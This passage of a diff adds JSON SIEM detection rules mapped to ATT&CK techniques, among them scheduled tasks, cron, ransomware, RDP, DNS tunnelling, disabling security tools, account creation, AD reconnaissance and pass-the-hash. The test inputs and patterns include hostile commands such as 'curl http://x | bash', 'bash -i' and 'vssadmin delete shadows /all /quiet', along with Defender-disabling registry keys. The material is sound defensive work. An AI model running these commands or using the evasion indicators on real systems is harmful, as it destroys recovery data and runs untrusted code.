+        "Transcription"
+       ]
+      },
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        4657,
+        13
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate GPO changes (correlate with change ticket)"
+     ],
+     "tuning": [
+      "Protect logging GPOs; alert on any local override"
+     ],
+     "tests": [
+      {
+       "name": "Logging disabled",
+       "input": {
+        "EventID": 4657,
+        "ObjectName": "...\\ScriptBlockLogging",
+        "NewValue": "0"
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1053.005": {
+   "name": "Scheduled Task",
+   "scenarios": [
+    {
+     "id": "SCHTASK-01",
+     "name": "Scheduled task created",
+     "objective": "Detect task creation via 4698 or schtasks/New-ScheduledTask command telemetry.",
+     "logic_type": "process",
+     "severity": "medium",
+     "keywords": [
+      "4698",
+      "schtasks",
+      "scheduled task"
+     ],
+     "event_ids": [
+      4698,
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "windows_security",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4698
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Software installers and management agents create tasks routinely"
+     ],
+     "tuning": [
+      "Baseline task names/paths; alert on tasks whose action is a script host or lives in a temp/user path",
+      "Correlate creator process"
+     ],
+     "tests": [
+      {
+       "name": "Task created",
+       "input": {
+        "EventID": 4698,
+        "TaskName": "\\Updater"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "SCHTASK-02",
+     "name": "Task action runs a script host or temp binary",
+     "objective": "Detect created/updated tasks whose action command invokes a script interpreter or a binary in a user/temp directory.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "action",
+      "temp",
+      "script host"
+     ],
+     "event_ids": [
+      4698,
+      4702
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        4698,
+        4702
+       ]
+      },
+      {
+       "field": "TaskContent",
+       "op": "contains_any",
+       "value": [
+        "powershell",
+        "wscript",
+        "cscript",
+        "mshta",
+        "cmd /c",
+        "\\temp\\",
+        "\\appdata\\",
+        "\\public\\"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Some legitimate deployment tasks use script hosts"
+     ],
+     "tuning": [
+      "Allowlist signed management tooling",
+      "Pair with the creator-process context"
+     ],
+     "tests": [
+      {
+       "name": "Task runs from temp",
+       "input": {
+        "EventID": 4698,
+        "TaskContent": "cmd /c C:\\Users\\Public\\x.bat"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "SCHTASK-03",
+     "name": "Task created on a remote host",
+     "objective": "Detect task creation where the logon is a network/remote session \u2014 lateral persistence.",
+     "logic_type": "correlation",
+     "severity": "high",
+     "keywords": [
+      "remote",
+      "network logon",
+      "lateral"
+     ],
+     "event_ids": [
+      4698,
+      4624
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4698
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "Computer"
+      ],
+      "threshold": 2,
+      "window_minutes": 5,
+      "steps": [
+       "4624 LogonType 3 from a remote host",
+       "4698 task created shortly after on the same host"
+      ]
+     },
+     "fp": [
+      "Remote admin tools that schedule maintenance"
+     ],
+     "tuning": [
+      "Scope to servers; exclude patch windows"
+     ],
+     "tests": [
+      {
+       "name": "Remote task creation",
+       "input": {
+        "step1": {
+         "EventID": 4624,
+         "LogonType": 3
+        },
+        "step2": {
+         "EventID": 4698
+        },
+        "within_minutes": 2
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1053.003": {
+   "name": "Cron",
+   "scenarios": [
+    {
+     "id": "CRON-01",
+     "name": "New or modified cron entry",
+     "objective": "Detect auditd file writes to cron directories or crontab syscalls.",
+     "logic_type": "process",
+     "severity": "medium",
+     "keywords": [
+      "cron",
+      "crontab",
+      "auditd"
+     ],
+     "event_ids": [],
+     "log_source_types": [
+      "linux_auditd"
+     ],
+     "selection": [
+      {
+       "field": "path",
+       "op": "contains_any",
+       "value": [
+        "/etc/cron",
+        "/var/spool/cron",
+        "/etc/crontab"
+       ]
+      },
+      {
+       "field": "key",
+       "op": "in",
+       "value": [
+        "cron",
+        "cron_persist"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Package installs and config management (Ansible/Puppet) write cron entries"
+     ],
+     "tuning": [
+      "Allowlist config-management users",
+      "Alert when the cron command references a script host or a world-writable path"
+     ],
+     "tests": [
+      {
+       "name": "Cron file written",
+       "input": {
+        "key": "cron",
+        "path": "/etc/cron.d/x",
+        "syscall": "open"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "CRON-02",
+     "name": "Cron entry invokes a network download or shell",
+     "objective": "Detect cron content that pipes a downloader to a shell or references /tmp.",
+     "logic_type": "process",
+     "severity": "high",
+     "keywords": [
+      "cron",
+      "curl",
+      "wget",
+      "/tmp"
+     ],
+     "event_ids": [],
+     "log_source_types": [
+      "linux_auditd"
+     ],
+     "selection": [
+      {
+       "field": "proctitle",
+       "op": "contains_any",
+       "value": [
+        "curl",
+        "wget",
+        "/tmp/",
+        "bash -i",
+        "base64 -d"
+       ]
+      },
+      {
+       "field": "key",
+       "op": "eq",
+       "value": "cron"
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate update jobs that fetch artifacts"
+     ],
+     "tuning": [
+      "Allowlist known update endpoints"
+     ],
+     "tests": [
+      {
+       "name": "Cron downloads and runs",
+       "input": {
+        "key": "cron",
+        "proctitle": "curl http://x | bash"
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1486": {
+   "name": "Data Encrypted for Impact (Ransomware)",
+   "scenarios": [
+    {
+     "id": "RANSOM-01",
+     "name": "Mass file modification by one process",
+     "objective": "Detect a single process modifying/renaming a high volume of files across directories in a short window.",
+     "logic_type": "threshold",
+     "severity": "critical",
+     "keywords": [
+      "mass",
+      "file modification",
+      "rename",
+      "ransom"
+     ],
+     "event_ids": [
+      11,
+      2
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        11,
+        2
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "Image"
+      ],
+      "threshold": 200,
+      "window_minutes": 5,
+      "distinct": "TargetFilename"
+     },
+     "fp": [
+      "Backup, indexing, sync and compression tools",
+      "Legitimate bulk file operations"
+     ],
+     "tuning": [
+      "Allowlist backup/sync agents by signer",
+      "Weight higher when new file extensions appear across many directories"
+     ],
+     "tests": [
+      {
+       "name": "One process rewrites 500 files",
+       "input": {
+        "EventID": 11,
+        "Image": "C:\\x.exe",
+        "distinct_files": 500,
+        "window_minutes": 3
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RANSOM-02",
+     "name": "Shadow copy / backup deletion",
+     "objective": "Detect commands or events that delete volume shadow copies or disable recovery.",
+     "logic_type": "process",
+     "severity": "critical",
+     "keywords": [
+      "vssadmin",
+      "shadow",
+      "wbadmin",
+      "bcdedit",
+      "recovery"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "shadows /all /quiet",
+        "delete shadows",
+        "delete catalog",
+        "recoveryenabled no",
+        "resize shadowstorage"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Rare legitimate admin maintenance (require change ticket)"
+     ],
+     "tuning": [
+      "Alert at high severity regardless; pair with RANSOM-01"
+     ],
+     "tests": [
+      {
+       "name": "Shadow copies deleted",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "vssadmin delete shadows /all /quiet"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RANSOM-03",
+     "name": "Ransom note written across shares",
+     "objective": "Detect creation of identically named files (e.g. readme/recover) in many directories.",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "ransom note",
+      "readme",
+      "recover"
+     ],
+     "event_ids": [
+      11
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 11
+      },
+      {
+       "field": "TargetFilename",
+       "op": "contains_any",
+       "value": [
+        "readme",
+        "recover",
+        "decrypt",
+        "how_to",
+        "restore"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "TargetFilename_basename"
+      ],
+      "threshold": 20,
+      "window_minutes": 5,
+      "distinct": "directory"
+     },
+     "fp": [
+      "Documentation tools that scatter README files"
+     ],
+     "tuning": [
+      "Tune the basename keyword list to observed campaigns"
+     ],
+     "tests": [
+      {
+       "name": "Note in 30 directories",
+       "input": {
+        "EventID": 11,
+        "TargetFilename_basename": "HOW_TO_DECRYPT.txt",
+        "distinct_directories": 30
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RANSOM-04",
+     "name": "New high-entropy extension appears en masse",
+     "objective": "Detect a surge of files gaining a new, uncommon extension.",
+     "logic_type": "statistical",
+     "severity": "high",
+     "keywords": [
+      "extension",
+      "entropy",
+      "mass rename"
+     ],
+     "event_ids": [
+      11
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 11
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "new_value",
+      "group_by": [
+       "file_extension"
+      ],
+      "threshold": 100,
+      "window_minutes": 10,
+      "baseline_days": 14
+     },
+     "fp": [
+      "Legitimate new file formats from a new application"
+     ],
+     "tuning": [
+      "Baseline extensions per file server"
+     ],
+     "tests": [
+      {
+       "name": "100 files gain .locked",
+       "input": {
+        "EventID": 11,
+        "file_extension": ".locked",
+        "count": 100,
+        "baseline_seen": false
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1021.001": {
+   "name": "Remote Desktop Protocol",
+   "scenarios": [
+    {
+     "id": "RDP-01",
+     "name": "RDP logon from an unusual source",
+     "objective": "Detect LogonType 10 (4624) from a source not in the baseline for that destination.",
+     "logic_type": "baseline",
+     "severity": "medium",
+     "keywords": [
+      "3389",
+      "logontype 10",
+      "rdp"
+     ],
+     "event_ids": [
+      4624
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4624
+      },
+      {
+       "field": "LogonType",
+       "op": "eq",
+       "value": "10"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "new_value",
+      "group_by": [
+       "Computer"
+      ],
+      "threshold": 1,
+      "window_minutes": 1440,
+      "observe": "IpAddress",
+      "baseline_days": 30
+     },
+     "fp": [
+      "Jump hosts and admin bastions (allowlist)"
+     ],
+     "tuning": [
+      "Restrict RDP to bastions; baseline per destination"
+     ],
+     "tests": [
+      {
+       "name": "RDP from new source",
+       "input": {
+        "EventID": 4624,
+        "LogonType": 10,
+        "IpAddress": "10.9.9.9",
+        "baseline_seen": false
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RDP-02",
+     "name": "Internet-facing or cross-zone RDP",
+     "objective": "Detect RDP connections crossing from a lower-trust to a higher-trust zone.",
+     "logic_type": "correlation",
+     "severity": "high",
+     "keywords": [
+      "rdp",
+      "zone",
+      "cross-zone"
+     ],
+     "event_ids": [
+      4624
+     ],
+     "log_source_types": [
+      "windows_security",
+      "firewall",
+      "proxy",
+      "netflow"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4624
+      },
+      {
+       "field": "LogonType",
+       "op": "eq",
+       "value": "10"
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Approved cross-zone admin paths (allowlist by source)"
+     ],
+     "tuning": [
+      "Map source IP to zone via the asset inventory",
+      "Alert when source zone is DMZ/User LAN and destination is Server/DC zone"
+     ],
+     "tests": [
+      {
+       "name": "RDP DMZ->DC",
+       "input": {
+        "EventID": 4624,
+        "LogonType": 10,
+        "src_zone": "DMZ",
+        "dst_zone": "Domain Controller Zone"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RDP-03",
+     "name": "RDP brute force then success",
+     "objective": "Correlate repeated 4625 LogonType 10 failures with a subsequent 4624 success from the same source.",
+     "logic_type": "multi_source",
+     "severity": "high",
+     "keywords": [
+      "rdp",
+      "brute force",
+      "success"
+     ],
+     "event_ids": [
+      4625,
+      4624
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4625
+      },
+      {
+       "field": "LogonType",
+       "op": "eq",
+       "value": "10"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "IpAddress"
+      ],
+      "threshold": 2,
+      "window_minutes": 30,
+      "steps": [
+       "\u226510 RDP failures from one source",
+       "4624 LogonType 10 success from the same source"
+      ]
+     },
+     "fp": [
+      "A user repeatedly mistyping then succeeding"
+     ],
+     "tuning": [
+      "Raise the failure threshold to reduce noise"
+     ],
+     "tests": [
+      {
+       "name": "Failures then success",
+       "input": {
+        "step1": {
+         "EventID": 4625,
+         "LogonType": 10,
+         "count": 15
+        },
+        "step2": {
+         "EventID": 4624,
+         "LogonType": 10
+        },
+        "within_minutes": 10
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1071.004": {
+   "name": "DNS (C2)",
+   "scenarios": [
+    {
+     "id": "DNSC2-01",
+     "name": "High-volume DNS to a single domain",
+     "objective": "Detect a host issuing an abnormal number of queries to one registrable domain.",
+     "logic_type": "threshold",
+     "severity": "medium",
+     "keywords": [
+      "dns",
+      "beacon",
+      "tunnel"
+     ],
+     "event_ids": [
+      22
+     ],
+     "log_source_types": [
+      "dns",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 22
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "src_host"
+      ],
+      "threshold": 500,
+      "window_minutes": 10,
+      "distinct": "query_subdomain",
+      "group2": "registrable_domain"
+     },
+     "fp": [
+      "CDNs, telemetry and software-update domains"
+     ],
+     "tuning": [
+      "Allowlist high-volume legitimate domains",
+      "Combine with long average query length"
+     ],
+     "tests": [
+      {
+       "name": "1000 subdomains of one domain in 10m",
+       "input": {
+        "EventID": 22,
+        "src_host": "WS-1",
+        "registrable_domain": "x.example",
+        "distinct_subdomains": 1000
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "DNSC2-02",
+     "name": "Long or high-entropy DNS labels",
+     "objective": "Detect queries whose labels are unusually long or random, suggesting encoded tunneling.",
+     "logic_type": "statistical",
+     "severity": "medium",
+     "keywords": [
+      "dns",
+      "entropy",
+      "long label",
+      "tunnel"
+     ],
+     "event_ids": [
+      22
+     ],
+     "log_source_types": [
+      "dns"
+     ],
+     "selection": [
+      {
+       "field": "query_length",
+       "op": "gt",
+       "value": 52
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Some cloud services use long hostnames",
+      "DKIM/antivirus lookups"
+     ],
+     "tuning": [
+      "Score on Shannon entropy of the leftmost label",
+      "Allowlist known long-label services"
+     ],
+     "tests": [
+      {
+       "name": "Long random label",
+       "input": {
+        "EventID": 22,
+        "query": "a8f3k...long.example",
+        "query_length": 80
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "DNSC2-03",
+     "name": "DNS to a newly observed / low-reputation domain",
+     "objective": "Detect queries to registrable domains first seen in the environment within N days.",
+     "logic_type": "baseline",
+     "severity": "medium",
+     "keywords": [
+      "dns",
+      "new domain",
+      "rare"
+     ],
+     "event_ids": [
+      22
+     ],
+     "log_source_types": [
+      "dns"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 22
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "new_value",
+      "group_by": [
+       "registrable_domain"
+      ],
+      "threshold": 1,
+      "window_minutes": 43200,
+      "baseline_days": 30
+     },
+     "fp": [
+      "Normal browsing to new sites (scope to servers)"
+     ],
+     "tuning": [
+      "Scope to server VLANs where new domains are rarer",
+      "Enrich with passive-DNS age if available"
+     ],
+     "tests": [
+      {
+       "name": "Server queries brand-new domain",
+       "input": {
+        "EventID": 22,
+        "src_zone": "Server LAN",
+        "registrable_domain": "new.example",
+        "baseline_seen": false
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1562.001": {
+   "name": "Disable or Modify Security Tools",
+   "scenarios": [
+    {
+     "id": "DEFEVADE-01",
+     "name": "Security service stopped or disabled",
+     "objective": "Detect service stop/disable or tamper events for EDR/AV/logging services.",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "7036",
+      "service stopped",
+      "defender",
+      "edr",
+      "tamper"
+     ],
+     "event_ids": [
+      7036,
+      7040,
+      4697,
+      16
+     ],
+     "log_source_types": [
+      "windows_security",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "ServiceName",
+       "op": "contains_any",
+       "value": [
+        "Defender",
+        "Sense",
+        "CSFalcon",
+        "SentinelAgent",
+        "Sysmon",
+        "AMSI",
+        "wuauserv",
+        "WinDefend",
+        "SecurityHealthService"
+       ]
+      },
+      {
+       "field": "message",
+       "op": "contains_any",
+       "value": [
+        "stopped",
+        "disabled"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Approved maintenance or upgrades (require change ticket)"
+     ],
+     "tuning": [
+      "Feed the protected-service list from the EDR inventory",
+      "Alert at high severity and auto-create an offense"
+     ],
+     "tests": [
+      {
+       "name": "EDR service stopped",
+       "input": {
+        "EventID": 7036,
+        "ServiceName": "CSFalconService",
+        "message": "stopped"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "DEFEVADE-02",
+     "name": "Defender real-time protection turned off",
+     "objective": "Detect registry/config or Defender operational events disabling real-time protection.",
+     "logic_type": "state_change",
+     "severity": "high",
+     "keywords": [
+      "5001",
+      "realtime",
+      "disableantispyware",
+      "defender"
+     ],
+     "event_ids": [
+      5001,
+      4657,
+      13
+     ],
+     "log_source_types": [
+      "windows_security",
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "ObjectName",
+       "op": "contains_any",
+       "value": [
+        "DisableRealtimeMonitoring",
+        "DisableAntiSpyware",
+        "DisableBehaviorMonitoring"
+       ]
+      },
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        5001,
+        4657,
+        13
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Legitimate GPO configuration (correlate change ticket)"
+     ],
+     "tuning": [
+      "Protect the Defender policy keys; alert on local overrides"
+     ],
+     "tests": [
+      {
+       "name": "RTP disabled",
+       "input": {
+        "EventID": 5001
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "DEFEVADE-03",
+     "name": "Telemetry source goes silent",
+     "objective": "Detect a previously reporting log source that stops sending events \u2014 possible agent kill or collector block.",
+     "logic_type": "statistical",
+     "severity": "high",
+     "keywords": [
+      "silent",
+      "log source",
+      "heartbeat",
+      "collector"
+     ],
+     "event_ids": [],
+     "log_source_types": [
+      "siem_internal"
+     ],
+     "selection": [],
+     "exclusions": [],
+     "agg": {
+      "fn": "absence",
+      "group_by": [
+       "log_source_id"
+      ],
+      "threshold": 1,
+      "window_minutes": 60,
+      "baseline_days": 7,
+      "expect_events": true
+     },
+     "fp": [
+      "Host offline for legitimate reasons (patching, decommission)"
+     ],
+     "tuning": [
+      "Cross-check the asset inventory for planned downtime",
+      "Scope to critical sources first"
+     ],
+     "tests": [
+      {
+       "name": "Critical source silent 60m",
+       "input": {
+        "log_source_id": "dc01-sec",
+        "expected": true,
+        "seen": false,
+        "window_minutes": 60
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1136.002": {
+   "name": "Create Account: Domain Account",
+   "scenarios": [
+    {
+     "id": "ACCT-01",
+     "name": "Domain account created",
+     "objective": "Detect 4720 user-account creation on a domain controller.",
+     "logic_type": "process",
+     "severity": "medium",
+     "keywords": [
+      "4720",
+      "account created"
+     ],
+     "event_ids": [
+      4720
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4720
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Normal joiner/mover/leaver provisioning by IAM"
+     ],
+     "tuning": [
+      "Allowlist IAM service accounts as the creator (SubjectUserName)",
+      "Alert when created by a non-IAM account"
+     ],
+     "tests": [
+      {
+       "name": "Account created by non-IAM user",
+       "input": {
+        "EventID": 4720,
+        "SubjectUserName": "jdoe"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "ACCT-02",
+     "name": "New account added to a privileged group",
+     "objective": "Correlate account creation (4720) with addition to a privileged group (4728/4732/4756) shortly after.",
+     "logic_type": "correlation",
+     "severity": "high",
+     "keywords": [
+      "4720",
+      "4728",
+      "privileged group",
+      "domain admins"
+     ],
+     "event_ids": [
+      4720,
+      4728,
+      4732,
+      4756
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "in",
+       "value": [
+        4728,
+        4732,
+        4756
+       ]
+      },
+      {
+       "field": "GroupName",
+       "op": "contains_any",
+       "value": [
+        "Admins",
+        "Administrators",
+        "Operators"
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "sequence",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 2,
+      "window_minutes": 60,
+      "steps": [
+       "4720 account created",
+       "same account added to a privileged group within 60 minutes"
+      ]
+     },
+     "fp": [
+      "Legitimate privileged provisioning (correlate change ticket)"
+     ],
+     "tuning": [
+      "Maintain the privileged-group watchlist",
+      "Alert at high severity"
+     ],
+     "tests": [
+      {
+       "name": "Create then add to Domain Admins",
+       "input": {
+        "step1": {
+         "EventID": 4720,
+         "TargetUserName": "svc_new"
+        },
+        "step2": {
+         "EventID": 4728,
+         "GroupName": "Domain Admins",
+         "MemberName": "svc_new"
+        },
+        "within_minutes": 5
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "ACCT-03",
+     "name": "Account created outside business hours",
+     "objective": "Detect 4720 occurring outside the organisation's change window.",
+     "logic_type": "time_based",
+     "severity": "medium",
+     "keywords": [
+      "4720",
+      "off hours",
+      "after hours"
+     ],
+     "event_ids": [
+      4720
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4720
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "time_window",
+      "group_by": [
+       "SubjectUserName"
+      ],
+      "threshold": 1,
+      "window_minutes": 0,
+      "outside_hours": "18:00-07:00",
+      "weekends": true
+     },
+     "fp": [
+      "Follow-the-sun IAM teams in other time zones"
+     ],
+     "tuning": [
+      "Set the hours per the actual change calendar"
+     ],
+     "tests": [
+      {
+       "name": "Account created at 03:00",
+       "input": {
+        "EventID": 4720,
+        "hour": 3
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1087.002": {
+   "name": "Account Discovery: Domain Account",
+   "scenarios": [
+    {
+     "id": "RECON-01",
+     "name": "AD enumeration tooling on an endpoint",
+     "objective": "Flag process/command telemetry matching known AD-recon tool indicators.",
+     "logic_type": "process",
+     "severity": "medium",
+     "keywords": [
+      "bloodhound",
+      "sharphound",
+      "adfind",
+      "net group"
+     ],
+     "event_ids": [
+      1,
+      4688,
+      4104
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr",
+      "powershell"
+     ],
+     "selection": [
+      {
+       "field": "CommandLine",
+       "op": "contains_any",
+       "value": [
+        "sharphound",
+        "invoke-bloodhound",
+        "adfind",
+        "get-netuser",
+        "get-domainuser",
+        "net group \"domain admins\""
+       ]
+      }
+     ],
+     "exclusions": [],
+     "agg": null,
+     "fp": [
+      "Administrators and auditors running legitimate directory queries"
+     ],
+     "tuning": [
+      "Allowlist admin workstations/accounts",
+      "Raise confidence on collection-style flags"
+     ],
+     "tests": [
+      {
+       "name": "Recon tool indicator",
+       "input": {
+        "EventID": 1,
+        "CommandLine": "... -CollectionMethod All"
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "RECON-02",
+     "name": "Directory enumeration burst via LDAP",
+     "objective": "Detect a host performing a burst of directory-object reads (4662) across many objects.",
+     "logic_type": "threshold",
+     "severity": "medium",
+     "keywords": [
+      "4662",
+      "ldap",
+      "enumeration"
+     ],
+     "event_ids": [
+      4662
+     ],
+     "log_source_types": [
+      "active_directory",
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4662
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "SubjectUserName"
+      ],
+      "threshold": 300,
+      "window_minutes": 10,
+      "distinct": "ObjectName"
+     },
+     "fp": [
+      "Directory-sync and IAM reconciliation jobs"
+     ],
+     "tuning": [
+      "Allowlist sync service accounts",
+      "Baseline per-account object-read volume"
+     ],
+     "tests": [
+      {
+       "name": "300 objects read in 10m",
+       "input": {
+        "EventID": 4662,
+        "SubjectUserName": "jdoe",
+        "distinct_objects": 300
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1550.002": {
+   "name": "Pass the Hash",
+   "scenarios": [
+    {
+     "id": "PTH-01",
+     "name": "NTLM network logon with anomalous pattern",
+     "objective": "Detect LogonType 3 with NTLM (4624/4776) where the account normally uses Kerberos, from an unusual host.",
+     "logic_type": "correlation",
+     "severity": "high",
+     "keywords": [
+      "ntlm",
+      "4776",
+      "logontype 3",
+      "pass the hash"
+     ],
+     "event_ids": [
+      4624,
+      4776
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4624
+      },
+      {
+       "field": "LogonType",
+       "op": "eq",
+       "value": "3"
+      },
+      {
+       "field": "AuthenticationPackageName",
+       "op": "eq",
+       "value": "NTLM"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "new_value",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 1,
+      "window_minutes": 1440,
+      "observe": "WorkstationName",
+      "baseline_days": 30
+     },
+     "fp": [
+      "Legacy apps that force NTLM",
+      "Non-domain-joined hosts"
+     ],
+     "tuning": [
+      "Reduce NTLM usage; baseline per-account NTLM hosts",
+      "Correlate with LSASS-01 on the source"
+     ],
+     "tests": [
+      {
+       "name": "NTLM from new workstation",
+       "input": {
+        "EventID": 4624,
+        "LogonType": 3,
+        "AuthenticationPackageName": "NTLM",
+        "WorkstationName": "NEWHOST",
+        "baseline_seen": false
+       },
+       "expected": "match"
+      }
+     ]
+    },
+    {
+     "id": "PTH-02",
+     "name": "Same account, many hosts, NTLM, short window",
+     "objective": "Detect one account authenticating via NTLM network logon to many hosts rapidly.",
+     "logic_type": "threshold",
+     "severity": "high",
+     "keywords": [
+      "ntlm",
+      "lateral",
+      "many hosts"
+     ],
+     "event_ids": [
+      4624
+     ],
+     "log_source_types": [
+      "windows_security"
+     ],
+     "selection": [
+      {
+       "field": "EventID",
+       "op": "eq",
+       "value": 4624
+      },
+      {
+       "field": "LogonType",
+       "op": "eq",
+       "value": "3"
+      },
+      {
+       "field": "AuthenticationPackageName",
+       "op": "eq",
+       "value": "NTLM"
+      }
+     ],
+     "exclusions": [],
+     "agg": {
+      "fn": "count",
+      "group_by": [
+       "TargetUserName"
+      ],
+      "threshold": 10,
+      "window_minutes": 10,
+      "distinct": "Computer"
+     },
+     "fp": [
+      "Scanners and management tools using one service account"
+     ],
+     "tuning": [
+      "Exclude known management service accounts"
+     ],
+     "tests": [
+      {
+       "name": "One account, 15 hosts via NTLM in 10m",
+       "input": {
+        "EventID": 4624,
+        "LogonType": 3,
+        "AuthenticationPackageName": "NTLM",
+        "distinct_Computer": 15
+       },
+       "expected": "match"
+      }
+     ]
+    }
+   ]
+  },
+  "T1190": {
+   "name": "Exploit Public-Facing Application",
+   "scenarios": [
+    {
+     "id": "EXPLOIT-01",
+     "name": "Web server spawns a shell or script host",
+     "objective": "Detect a web/app server process spawning cmd/powershell/sh \u2014 classic post-exploitation on a public app.",
+     "logic_type": "process",
+     "severity": "critical",
+     "keywords": [
+      "w3wp",
+      "tomcat",
+      "child process",
+      "web shell"
+     ],
+     "event_ids": [
+      1,
+      4688
+     ],
+     "log_source_types": [
+      "sysmon",
+      "edr"
+     ],
+     "selection": [
+      {
+       "field": "ParentImage",
+       "op": "endswith_any",
+       "value": [
+        "\\w3wp.exe",
+        "\\httpd.exe",
+        "\\nginx.exe",
+        "\\java.exe",
+        "\\php-cgi.exe",
+        "\\tomcat*.exe"
+       ]
+      },
+      {
+       "field": "Image",
